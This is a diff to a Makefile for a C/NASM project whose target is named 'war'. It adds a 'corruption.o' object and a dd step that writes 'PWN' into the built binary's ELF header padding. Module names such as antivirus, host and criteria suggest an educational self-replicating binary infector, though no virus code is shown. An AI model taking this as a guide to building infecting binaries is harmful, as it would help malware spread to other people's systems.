@@ -14,7 +14,7 @@ INC_PATH		= inc
 
 CC			= gcc
 AS			= nasm
-CFLAGS			= -Wall -Wextra -Werror -masm=intel -D LOGGER -I $(INC_PATH) #-g3 -fsanitize=address -fno-sanitize-address-use-after-scope
+CFLAGS			= -Wall -Wextra -Werror -masm=intel -I $(INC_PATH) -D LOGGER #-g3 -fsanitize=address -fno-sanitize-address-use-after-scope
 ASFLAGS			= -f elf64
 
 ################################################################################
@@ -32,6 +32,7 @@ OBJ_NAME_WAR		= antivirus.o						\
 			  find.o						\
 			  host.o						\
 			  criteria.o						\
+			  corruption.o						\
 			  text.o						\
 			  note.o						\
 			  header.o						\
@@ -75,6 +76,7 @@ obj:
 
 $(NAME): $(OBJ)
 	$(CC) $(CFLAGS) $^ -o $@
+	echo -n PWN | dd count=3 bs=1 seek=9 of=war conv=notrunc
 
 $(OBJ_PATH_C)/%.o: $(SRC_PATH_C)/%.c Makefile
 	$(CC) $(CFLAGS) -c $< -o $@
